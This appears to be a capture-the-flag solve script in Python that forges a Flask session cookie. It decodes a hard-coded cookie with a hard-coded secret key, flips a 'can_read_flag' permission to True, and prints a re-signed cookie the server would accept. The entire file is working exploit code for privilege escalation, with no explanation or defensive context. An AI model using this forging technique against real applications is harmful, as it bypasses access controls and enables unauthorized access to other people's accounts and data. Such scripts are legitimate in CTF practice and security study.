from flask.sessions import SecureCookieSessionInterface

session_cookie = "eyJjYW5fcmVhZF9mbGFnIjpmYWxzZSwiaXNfYWRtaW4iOnRydWV9.YXjU7w.w9asQCbJApcTY-bfEBE_Ge9TTlA"
class App:
    secret_key = "420bf172a6297fc6558b8a6075af347a83b124ccd8551b181a62bac7aefef321"

s = SecureCookieSessionInterface().get_signing_serializer(App)
data = s.loads(session_cookie)
data["can_read_flag"] = True
print(s.dumps(data))